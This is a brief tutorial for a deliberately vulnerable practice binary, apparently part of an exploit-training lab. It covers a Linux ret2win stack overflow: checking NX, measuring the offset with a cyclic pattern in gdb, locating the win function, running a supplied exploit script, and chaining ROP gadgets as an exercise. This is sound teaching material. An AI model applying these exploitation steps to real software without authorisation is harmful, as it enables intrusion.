# Tutorial — Linux NX ret2win

## Check NX

```bash
readelf -l bin/dobetter_linux_ret2win | grep -A1 GNU_STACK
# expect RW, not RWE
```

## Measure offset

```bash
gdb -q ./bin/dobetter_linux_ret2win
(gdb) run <<< $(python3 -c 'from exploits.common import cyclic; import sys; sys.stdout.buffer.write(cyclic(300)+b"\n")')
# info registers rip → cyclic find
```

Host-tested ballpark: **OFFSET=152** (GCC on Ubuntu for this tree). **Measure**.

Payloads must be **≥ 64** bytes (short names are safe `Hello…` only).

## ret2win

```bash
nm bin/dobetter_linux_ret2win | grep ' win$'
OFFSET=152 WIN=0x40.... python3 exploits/06_ret2win.py
```

Expect `[WIN] Linux ret2win` on stdout.

## Stretch

Chain `gadget_ret` a few times before `win` to practice multi-ret ROP on Linux.
